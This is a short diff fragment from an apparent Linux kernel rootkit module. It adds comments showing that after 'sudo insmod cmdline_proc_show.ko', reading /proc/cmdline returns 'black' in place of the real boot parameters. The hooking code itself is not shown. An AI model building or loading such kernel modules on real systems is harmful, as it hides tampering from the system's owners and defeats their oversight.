@@ -43,3 +43,10 @@ static void __exit rootkit_exit(void)
 
 module_init(rootkit_init);
 module_exit(rootkit_exit);
+
+
+// ❯ cat /proc/cmdline
+// BOOT_IMAGE=/vmlinuz-linux root=PARTUUID=9a979cd3-6781-4f79-8de4-e79387a0aa63 rw loglevel=3 quiet
+// sudo insmod cmdline_proc_show.ko
+// ❯ cat /proc/cmdline
+// black
